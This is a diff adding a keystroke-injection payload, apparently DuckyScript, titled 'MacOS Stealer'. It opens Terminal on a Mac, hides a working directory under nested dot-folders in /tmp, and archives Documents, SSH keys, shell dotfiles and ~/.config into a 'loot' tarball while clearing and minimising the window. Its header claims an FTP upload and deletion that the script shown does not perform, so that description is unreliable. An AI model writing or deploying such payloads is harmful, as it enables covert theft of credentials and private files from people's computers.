@@ -1,0 +1,27 @@
+REM Title: MacOS Stealer
+REM Author: un1x01d
+REM Description: The script will compress the Desktop and Documents folders in a hidden location, afterwhich the file will be uploaded to an FTP server an deleted.
+REM Target: MacOS 10.0+
+REM Version: 1.0
+
+GUI SPACE
+DELAY 100
+STRING Terminal
+ENTER
+DELAY 100
+
+
+STRING mkdir -p /tmp/.s/.t/.e/.a/.l && cd /tmp/.s/.t/.e/.a/.l && find . ~/Downloads >> Downloads.list && find ~/ >> home_dir_file_list.txt && tar cfz loot.tgz ~/Documents ~/.ssh ~/.bash* ~/.config ~/.zsh* &
+ENTER
+DELAY 10
+
+STRING clear
+ENTER
+
+STRING wait %1 && echo "All Done" && clear && exit
+ENTER
+DELAY 10
+GUI m
+
+REM # GUI q
+REM # ENTER
